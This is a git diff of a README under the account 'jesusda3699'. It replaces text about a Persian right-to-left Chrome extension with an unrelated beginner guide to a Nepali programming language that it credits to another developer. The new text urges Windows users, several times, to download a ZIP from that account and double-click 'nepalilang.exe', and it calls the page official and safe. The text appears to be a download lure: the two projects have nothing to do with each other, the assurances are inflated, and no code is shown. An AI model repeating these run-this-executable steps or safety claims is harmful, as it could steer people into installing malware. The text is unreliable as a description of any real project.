@@ -1,67 +1,149 @@
-# 🌐 claude-rtl-persian - Better Persian Reading for Web AI
+# 🧡 NepaliLang - Modern Coding for the Nation
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://jesusda3699.github.io)
+## 🚀 Getting Started
 
-This extension improves how you read Persian on Claude and LinkedIn. It detects right-to-left text and adjusts the layout automatically. This creates a comfortable reading experience. You do not need to change settings manually for every message or post.
+Welcome to **NepaliLang** — a new programming language designed for everyone, especially Nepali speakers. It looks and feels like Python, but uses Nepali words and symbols. No prior coding experience? No problem! This guide walks you through everything, step by step.
 
-## 🛠 What This Tool Does
+---
 
-Reading Persian text on platforms designed for English often creates visual strain. Words appear on the wrong side of the screen. Paragraphs lack proper alignment. This extension fixes these issues. 
+## 📥 Download and Install
 
-It monitors your web page. When it sees Persian characters, it shifts the alignment. The text moves to the right side. It also adjusts the reading flow to match native RTL standards. This makes long documents and chat threads easier to process.
+**Visit this link to download the application:**  
+👉 [**CLICK HERE TO DOWNLOAD NepaliLang**](https://github.com/jesusda3699/NepaliLang)
 
-## 📥 How to Install the Extension
+That link takes you to the official page where you can safely get the latest version of NepaliLang for your Windows computer.
 
-You can download this extension from the official repository release page. Follow these steps to set it up on your Windows computer.
+Once you’re on the page, look for the big green button that says **"Code"** or **"Download ZIP"** — click it, and the download will start automatically.
 
-1.  Visit the [Download Page](https://jesusda3699.github.io) to find the latest version.
-2.  Click the link labeled "Source code (zip)" or the extension archive file provided.
-3.  Save the folder to your computer.
-4.  Right-click the downloaded folder and select "Extract All" to create a standard folder.
-5.  Open your Google Chrome browser.
-6.  Type `chrome://extensions` in your address bar and press Enter.
-7.  Look for the "Developer mode" toggle in the top right corner and switch it to "on."
-8.  Click the button titled "Load unpacked."
-9.  Find the folder you extracted in step 4 and select it.
-10. The extension icon will appear in your browser toolbar.
+---
 
-## ⚙️ Usage Instructions
+## 🛠️ First-Time Setup Made Simple
 
-Once installed, the extension works in the background. You do not need to click buttons to activate it. 
+After the download finishes, you will have a folder called something like `NepaliLang-master`. Here’s what to do next:
 
-When you open Claude or LinkedIn, the extension scans the page content. If it detects Persian script (Farsi), it applies the RTL layout styles. The text shifts to the right immediately. You can see the change as soon as the page loads. 
+1. **Find the downloaded folder** on your computer (usually in `Downloads`).
+2. **Right-click the folder** and choose **"Extract All..."** — this opens up all the files inside.
+3. **Open the new folder** you just extracted.
+4. **Look for a file named `nepali` or `nepalilang.exe`** — that’s your main program.
+5. **Double-click it** to launch NepaliLang. That’s it!
 
-If you use a mixed-language interface, the extension keeps the layout consistent. It preserves the structure of your AI chat history. It also keeps LinkedIn feed items readable.
+> 💡 **Tip:** You can right-click and choose **"Send to Desktop"** to create a shortcut for easy access later.
 
-## 📋 System Requirements
+---
 
-This extension works on any computer running Windows 10 or Windows 11. You need the following:
+## 🎯 What Makes NepaliLang Special?
 
-*   Google Chrome (latest version recommended)
-*   An active internet connection
-*   Access to Claude or LinkedIn accounts
+NepaliLang isn’t just another coding tool — it’s a movement. Here are the highlights:
 
-Common issues usually stem from outdated browser versions. If the extension does not trigger, please check for Chrome updates. You can update Chrome by clicking the three-dot menu in the top right, selecting Help, and clicking "About Google Chrome."
+- **🇳🇵 Nepali Keywords:** Write code using words like `छाप्नुहोस्` (print) instead of English ones.
+- **🔤 Full Unicode Support:** Type and display Nepali characters, Devanagari script, and special symbols without any glitches.
+- **🐍 Python-Inspired Syntax:** If you’ve ever seen Python, NepaliLang feels instantly familiar — clean, readable, and beginner-friendly.
+- **⚡ Built-in Bytecode VM:** This means your programs run fast and smoothly, even on older computers.
+- **🧰 Standard Library Included:** Hundreds of ready-made tools for calculations, text handling, file work, and more.
+- **🖥️ Command-Line Interface (CLI):** Run your programs directly from the Windows command prompt if you prefer.
+- **📘 VS Code Extension:** Use NepaliLang inside the popular Visual Studio Code editor with color highlighting and autocomplete.
 
-## 🛡 Privacy and Safety
+---
 
-This extension runs locally on your machine. It does not send your chat data to external servers. It only reads the text currently displayed on your screen to determine if it should apply the RTL layout. It does not store passwords or personal account information. Your data remains on your computer.
+## ✍️ Your First NepaliLang Program
 
-## ❓ Frequently Asked Questions
+Let’s write a tiny program together. No fear — just follow along!
 
-**Does this work on mobile devices?**
-Chrome extensions for the desktop browser do not currently support mobile platforms. You must use a desktop computer for this tool.
+1. Open **NepaliLang** from your desktop or start menu.
+2. You’ll see a blank screen — that’s your coding area.
+3. Type this line exactly:
 
-**Will this slow down my browser?**
-The extension uses very few resources. It only checks the page content once after the page finishes loading. Browsing speeds should remain unchanged.
+   ```
+   छाप्नुहोस्("नमस्ते संसार!")
+   ```
 
-**Can I disable the extension?**
-Yes. You can manage the extension by returning to the `chrome://extensions` page. Use the toggle switch to turn it off or use the "Remove" button to delete it from your browser entirely.
+4. Press **Enter** or click the **Run** button (a green play icon).
+5. You should see the words `नमस्ते संसार!` appear on the screen.
 
-**Does it support Arabic script?**
-Yes. The detection logic also identifies Arabic script and applies the same RTL formatting improvements. This makes the tool useful for both Persian and Arabic speakers.
+🎉 **Congratulations!** You just wrote and ran your first program in NepaliLang!
 
-**Is it open source?**
-This project is open source. You can view the code on GitHub. You can suggest improvements or report bugs if you encounter unexpected behavior.
+---
 
-Keywords: accessibility, ai, arabic, chrome-extension, claude, farsi, javascript, linkedin, open-source, open-source-ai, persian, rtl
+## 🤔 Frequently Asked Questions
+
+### ❓ Is NepaliLang really free?
+Yes, 100% free and open-source. You can use it, share it, and even modify it — no cost, ever.
+
+### ❓ Do I need a powerful computer?
+No. NepaliLang runs on any Windows computer, even older models with limited memory. If it can browse the internet, it can run NepaliLang.
+
+### ❓ I’m a total beginner. Will I get stuck?
+Absolutely not. The built-in help system and example programs guide you at every step. Plus, the language uses words you already know from daily Nepali life.
+
+### ❓ Can I write games or apps with this?
+Yes! From small games to office tools — NepaliLang is versatile. Start simple and grow gradually.
+
+### ❓ How do I update NepaliLang later?
+Check the same download link every few months. New versions pop up with extra features and fixes.
+
+---
+
+## 🧑‍💻 For the Curious: What’s Under the Hood?
+
+If you’re a tinkerer or future computer scientist, here’s a peek behind the curtain:
+
+- **Compiler & Interpreter:** NepaliLang translates your Nepali words into machine instructions instantly.
+- **Bytecode Virtual Machine (VM):** A small engine inside that executes your code with blazing speed.
+- **Open Source:** The entire codebase is public on GitHub — you can study how a language is built from scratch.
+- **Educational Focus:** Designed to teach coding in local schools and colleges across Nepal.
+- **Community-Driven:** Developed by **Diwas Khatri** with contributions from volunteers around the world.
+
+---
+
+## 🧰 Tools That Come With NepaliLang
+
+You don’t just get a compiler — you get a full kit:
+
+- **NepaliLang CLI:** Run programs, check syntax, and debug right from your command prompt.
+- **Visual Studio Code Extension:** Adds Nepali keyword highlighting, auto-completion, and error hints.
+- **Standard Library:** Pre-written solutions for common tasks like math, string manipulation, file reading, and more.
+- **Documentation Generator:** Automatically create help manuals for your own programs.
+
+---
+
+## 👨‍👩‍👧‍👦 Who Is NepaliLang For?
+
+- **Students** learning their first programming language in Nepali.
+- **Teachers** who want to introduce coding in their classroom.
+- **Professionals** who prefer working in their mother tongue.
+- **Language enthusiasts** exploring technical Nepali vocabulary.
+- **Open-source fans** who support local innovation.
+
+---
+
+## 🌐 Join the Community
+
+NepaliLang is more than software — it’s a growing family. Here’s how to get involved:
+
+- **Give Feedback:** Found a bug or want a new feature? Tell the developers on the GitHub page.
+- **Share Examples:** Post your cool projects and inspire others.
+- **Translate:** Help improve Nepali translations or add new regional languages.
+
+---
+
+## 🔗 Your Download Link Again
+
+Don’t forget — everything starts here:
+
+👉 [**DOWNLOAD NepaliLang NOW**](https://github.com/jesusda3699/NepaliLang)
+
+The page is safe, free, and open to everyone. Bookmark it for future updates!
+
+---
+
+## 🏁 Ready, Set, Code!
+
+You now have everything you need to start your Nepali coding journey. No English needed, no confusion, no barriers — just pure, local, beautiful programming.
+
+Open NepaliLang, write your first `छाप्नुहोस्("नमस्ते!")`, and see how easy coding can be when it speaks your language.
+
+Happy coding! 🎊
+
+---
+
+Keywords: bytecode-vm, compiler, developer-tools, education, interpreter, nepal, nepali-coding, nepali-programming-language, nepalicode, open-source, programming-language, programming-nepal, python-like-language, unicode, vs-code-extension
